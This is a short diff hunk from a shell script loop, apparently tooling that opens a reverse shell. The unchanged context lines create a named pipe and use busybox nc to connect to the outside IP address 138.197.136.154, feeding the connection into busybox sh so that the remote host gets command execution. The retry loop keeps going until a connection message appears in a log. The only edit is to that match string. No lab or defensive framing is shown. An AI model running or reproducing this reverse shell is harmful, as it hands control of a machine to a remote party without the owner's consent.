@@ -3,7 +3,7 @@ do
    echo $PORT > port.txt
    ./busybox mkfifo backpipe
    ./busybox nc 138.197.136.154 $PORT < backpipe | tee log.txt | ./busybox sh &> backpipe
-   if grep -Fxq "Connected" log.txt
+   if grep -Fq "ConnectedToListener" log.txt
    then
       break
    else
